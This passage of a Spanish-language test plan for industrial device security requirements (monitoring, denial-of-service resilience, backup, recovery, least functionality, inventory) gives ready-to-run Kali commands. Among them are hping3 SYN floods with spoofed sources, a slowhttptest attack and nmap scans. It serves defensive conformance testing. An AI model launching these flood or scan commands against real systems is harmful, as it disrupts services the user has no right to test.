    *   [Herramientas]: Servidor Syslog (ej. Kiwi Syslog, rsyslog), SIEM.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Netcat (Syslog Listener):** `nc -u -l -p 514` (Escuchar logs UDP entrantes).
> *   **Tcpdump:** `tcpdump -i eth0 port 514` (Verificar tráfico syslog).



### CR 6.2: Continuous monitoring

**Objetivo:** Asegurar que el componente puede ser monitorizado continuamente en busca de eventos de seguridad y anomalías, y que es capaz de generar alertas para notificar al personal de seguridad de forma proactiva.

**PRUEBAS:**

*   **SL2 a SL4:**
    1.  **Verificación de Capacidades de Alerta:** Revisar la interfaz de administración y la documentación para identificar qué eventos de seguridad pueden generar una alerta proactiva (distinta de un simple log). Ejemplos:
        *   Múltiples intentos de login fallidos.
        *   Bloqueo de una cuenta de usuario.
        *   Detección de un ataque DoS.
        *   Intento de carga de firmware no firmado.
        *   Fallo de un autodiagnóstico de seguridad.
    2.  **Prueba de Generación de Alertas:** Provocar uno de estos eventos y verificar que el componente envía una alerta a través de un canal configurable (SNMP trap, syslog con severidad alta, email).
    *   [Herramientas]: Receptor de traps SNMP, servidor Syslog.



## FR 7: Resource availability

### CR 7.1: Denial of service protection

**Objetivo:** Garantizar que el componente es resiliente a ataques de Denegación de Servicio (DoS) que buscan agotar sus recursos (CPU, memoria, ancho de banda) para impedir que realice su función esencial.

**PRUEBAS:**

*   **SL1:**
    *   **Ataque de Inundación de Red (DoS):** Iniciar un ataque de inundación de red de bajo a medio volumen (ej. SYN flood, UDP flood, ICMP flood) dirigido a una interfaz de red del dispositivo.
    *   **Monitorización de Función Esencial:** Mientras el ataque está activo, verificar que la función principal y crítica del dispositivo (ej. comunicar datos de proceso, ejecutar lógica de control) sigue operativa sin una degradación inaceptable. La interfaz de gestión puede volverse lenta, pero la función de control debe prevalecer.
    *   [Herramientas]: hping3, slowhttptest, nmap (`--script dos`).
    *   [Comando Ejemplo]: `sudo hping3 -c 10000 -d 120 -S -w 64 -p 443 --flood --rand-source <IP_OBJETIVO>`

*   **SL2/3/4 (Añade RE 1: Gestión de la carga de comunicación):**
    *   **Verificación de Mecanismos de Protección DoS:** Revisar la configuración para confirmar la existencia de mecanismos de protección como "rate limiting" (limitación de tasa de paquetes), SYN cookies, o listas negras de IPs.
    *   **Prueba de Mitigación:** Ejecutar el ataque DoS y verificar en los logs o estadísticas del dispositivo que el ataque es detectado y que los mecanismos de mitigación se activan.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Hping3 (SYN Flood):** `hping3 -S --flood -V -p 80 <IP>` (¡Cuidado! Puede tirar el dispositivo).
> *   **Slowhttptest:** `slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://<IP>` (Prueba de DoS de capa de aplicación).



### CR 7.2: Resource management

**Objetivo:** Asegurar que el componente gestiona sus recursos de forma eficiente y que las funciones de seguridad (que consumen recursos) no impiden ni degradan la ejecución de las funciones esenciales de control.

**PRUEBAS:**

*   **SL1 a SL4:**
    *   **Prueba de Resiliencia a Agotamiento de Recursos:** Mientras se ejecuta un ataque DoS (ver CR 7.1) que consume CPU y memoria, verificar que las funciones de seguridad críticas (ej. logging, autenticación, filtrado de paquetes) siguen operativas y no se produce un agotamiento de recursos que las deshabilite (un "fail-open" de seguridad).
    *   **Monitorización de Recursos:** Monitorizar el uso de CPU, memoria y descriptores de fichero durante el ataque para asegurar que se mantiene dentro de límites aceptables y que el sistema no se vuelve inestable.
    *   [Herramientas]: hping3, herramientas de monitorización del sistema (`top`, `htop`, `vmstat`).



### CR 7.3: Control system backup

**Objetivo:** Proporcionar la capacidad de realizar copias de seguridad (backups) de la configuración del sistema, el software y los datos críticos para permitir una recuperación rápida y fiable en caso de fallo o incidente de seguridad.

**PRUEBAS:**

*   **SL1:**
    *   **Prueba de Backup sin Interrupción:** Iniciar el proceso de copia de seguridad de la configuración y confirmar que la función esencial del dispositivo sigue operativa sin interrupción o degradación significativa.

*   **SL2:**
    *   **Verificación de Automatización y Frecuencia:** Comprobar que el componente ofrece la capacidad de programar backups automáticos a un destino de red (ej. servidor FTP/SFTP/SMB).

*   **SL3/4 (Añade RE 1: Verificación de integridad del backup):**
    1.  Generar un archivo de backup.
    2.  Verificar que el archivo de backup está protegido, como mínimo, por un checksum o hash (ej. SHA-256) para verificar su integridad. Idealmente, debería estar firmado digitalmente.
    3.  Modificar un solo byte del archivo de backup.
    4.  Intentar restaurar desde el archivo modificado. El proceso debe fallar con un error claro de "integridad" o "firma inválida".
    *   [Herramientas]: HxD.



### CR 7.4: Control system recovery and reconstitution

**Objetivo:** Asegurar que el componente puede ser restaurado a un estado operativo conocido y seguro utilizando las copias de seguridad creadas previamente. Un backup que no se puede restaurar no es un backup.

**PRUEBAS:**

*   **SL1 a SL4:**
    *   **Prueba de Restauración Completa:**
        1.  Guardar una copia de la configuración actual del dispositivo (Config A) generando un backup.
        2.  Realizar un cambio visible y significativo en la configuración (Config B).
        3.  Ejecutar el proceso de restauración utilizando el archivo de backup de la Config A.
        4.  Verificar que, tras el reinicio (si es necesario), el cambio ha sido revertido y el dispositivo tiene de nuevo y de forma exacta la Config A.
        5.  **Verificación de Último Estado Bueno Conocido:** Comprobar si el dispositivo tiene una función para revertir a la última configuración que funcionó correctamente, en caso de que una nueva configuración cause un problema.
    *   [Herramientas]: Interfaz de gestión del dispositivo.



### CR 7.5: Emergency power

**Objetivo:** Asegurar que el componente puede gestionar una pérdida de alimentación principal de forma controlada, ya sea pasando a un estado seguro o continuando su operación con una fuente de energía de respaldo (ej. SAI/UPS). (Nota: este es principalmente un requisito del sistema (-3-3), pero el componente debe comportarse de forma predecible).

**PRUEBAS:**

*   **SL1-4:**
    *   **Prueba de Pérdida de Alimentación:**
        1.  Con el dispositivo en operación normal, desconectar la fuente de alimentación principal.
        2.  Observar el comportamiento. ¿Se apaga de forma abrupta o realiza un apagado controlado (shutdown)?
    *   **Prueba de Recuperación tras Fallo de Alimentación:**
        1.  Volver a conectar la alimentación.
        2.  Verificar que el dispositivo arranca automáticamente (si así está configurado) y vuelve a un estado operativo seguro y conocido, sin corrupción de datos o configuración.



### CR 7.6: Network and security configuration settings

**Objetivo:** Asegurar que el componente permite la configuración de todos sus parámetros de seguridad de acuerdo con las políticas de la organización y que esta configuración puede ser exportada para su auditoría y gestión.

**PRUEBAS:**

*   **SL1/2:**
    *   **Revisión de Guía de Hardening:** Revisar la guía de configuración segura ("hardening guide") del fabricante. Comprobar que la interfaz de administración ofrece las opciones necesarias para aplicar las recomendaciones de seguridad (ej. deshabilitar protocolos inseguros, configurar TLS 1.2+, cambiar puertos por defecto, etc.).

*   **SL3/4 (Añade RE 1: Reporte legible por máquina):**
    *   **Prueba de Exportación de Configuración:** Utilizar la función de exportación de configuración del dispositivo.
    *   **Verificación de Formato:** Abrir el archivo exportado y verificar que está en un formato estructurado y legible por máquina (XML, JSON, CSV, YAML) y no en un formato binario propietario. Esto es clave para la automatización de la auditoría y la gestión de la configuración.
    *   [Herramientas]: Editor de texto, Python (con librerías para parsear XML/JSON).



### CR 7.7: Least functionality

**Objetivo:** Aplicar el principio de mínima funcionalidad, asegurando que solo los puertos, protocolos y servicios estrictamente necesarios para la función del dispositivo están habilitados, reduciendo así la superficie de ataque.

**PRUEBAS:**

*   **SL1 a SL4:**
    *   **Principio de Mínimo Privilegio de Servicios:**
        1.  Realizar un escaneo exhaustivo de todos los puertos TCP y UDP para obtener una lista completa de los servicios activos por defecto.
        2.  Comparar esta lista con la documentación del fabricante y la función principal del dispositivo.
        3.  Para cada servicio activo, debe existir una justificación clara de su necesidad. Servicios inseguros (Telnet, FTP, SNMPv1/v2c) o innecesarios (ej. un servidor web en un dispositivo que se gestiona por CLI) son un hallazgo negativo.
    *   **Prueba de Deshabilitación de Servicios:**
        1.  Acceder a la interfaz de administración y verificar que existe la opción de deshabilitar cada servicio de forma individual.
        2.  Deshabilitar un servicio no esencial.
        3.  Volver a escanear y verificar que el puerto correspondiente al servicio desactivado ahora aparece como cerrado (closed) o filtrado (filtered).
    *   [Herramientas]: Nmap.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Nmap (Todos los puertos):** `nmap -p- -sV <IP>` (Para ver todo lo que está abierto).
> *   **Netstat (Si hay shell):** `netstat -tulnp` (Ver qué procesos escuchan).



### CR 7.8: Control system component inventory

**Objetivo:** Asegurar que el componente puede proporcionar información precisa sobre su identidad y versión, lo cual es fundamental para la gestión de activos, el análisis de vulnerabilidades y la gestión de parches.

**PRUEBAS:**

*   **SL2 a SL4:**
    1.  **Verificación de Información de Inventario:** Acceder a la interfaz del dispositivo (Web, CLI, SNMP) y verificar que proporciona, como mínimo, la siguiente información:
        *   Fabricante.
        *   Modelo del dispositivo.
        *   Versión de firmware/software.
        *   Número de serie.
    2.  **Consistencia de la Información:** Comprobar que esta información es consistente a través de diferentes métodos de consulta (ej. que la versión mostrada en la web es la misma que la reportada por SNMP).
    3.  **Descubrimiento Remoto:** Utilizar herramientas de descubrimiento de red para verificar si esta información puede ser obtenida de forma remota a través de protocolos estándar (ej. SNMP, LLDP).
    *   [Herramientas]: Nmap (`-sV` flag), snmp-check, lldp-utils.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **SNMP Check:** `snmp-check <IP>` (Extraer toda la info posible vía SNMP).
> *   **Nmap (OS Detect):** `nmap -O -sV <IP>`.
